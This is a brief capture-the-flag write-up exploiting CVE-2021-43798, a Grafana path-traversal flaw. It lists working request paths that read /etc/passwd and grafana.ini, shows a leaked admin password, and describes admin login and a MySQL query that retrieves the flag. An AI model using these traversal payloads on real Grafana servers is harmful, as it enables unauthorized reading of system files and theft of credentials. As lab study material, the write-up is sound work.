# oh-my-grafana-EN

According to the 'cve-2021-43798' version 8.2.6 of grafana, there is LFI in unauthenticated state, and POC is

```
/public/plugins/alertlist/../../../../../../../../../../../../../etc/passwd
```

You can read grafana config file

```
/public/plugins/alertlist/../../../../../../../../../../../../../etc/grafana/grafana.ini
```

Two of the information are suspicious

```
# default admin user, created on startup
admin_user = admin

# default admin password, can be changed before first start of grafana,  or in profile settings
admin_password = 5f989714e132c9b04d4807dafeb10ade


# Either "mysql", "postgres" or "sqlite3", it's your choice
;type = mysql
;host = mysql:3306
;name = grafana
;user = grafana
# If the password contains # or ; you have to wrap it with triple quotes. Ex """#password;"""
;password = grafana
```

Set the access password of admin, and use the password `5f989714e132c9b04d4807dafeb10ade` to log in to the background; At the same time, it is found that there is a group of MySQL login password information. Using the `Data sources` function in`Configuration`, specify to load the remote MySQL data service, read the table information and column information by executing SQL statements, and finally read the flag.

```
select flag from fffffflllllllllaaaagggggg
```
